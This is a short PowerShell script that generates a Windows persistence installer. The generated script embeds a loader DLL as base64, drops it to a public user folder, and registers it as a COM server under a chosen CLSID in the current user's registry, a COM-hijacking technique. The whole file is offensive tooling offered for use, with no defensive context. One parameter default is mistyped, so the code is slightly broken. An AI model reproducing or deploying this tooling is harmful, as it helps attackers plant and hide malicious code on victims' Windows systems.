[CmdletBinding()]
Param (
	[Parameter(Mandatory = $True)] [string] $CLSID,
	[Parameter(Mandatory = $True)] [string] $LoaderDLL,
	[Parameter()] [string] $OutFile = "Install-Persistence.ps1",
	[Parameter()] [string] $DropLocation - "C:\users\public\default.dat"
)
$LoaderB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($LoaderDLL))

$Output = @"
	
[IO.File]::WriteAllBytes("$($DropLocation)", [Convert]::FromBase64String("$($LoaderB64)"))

New-Item -Path "HKCU:\Software\Classes\CLSID\$($clsid)" -Force | Out-Null
New-Item -Path "HKCU:\Software\Classes\CLSID\$($clsid)\InprocServer32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$($clsid)\InprocServer32" -Name "(Default)" -Value "$DropLocation" -Force | Out-Null

Write-Output "[+] Persistence Installed"

"@

Write-Output $Output | Out-File $OutFile
Write-Output "[+] Installer Created: $OutFile!"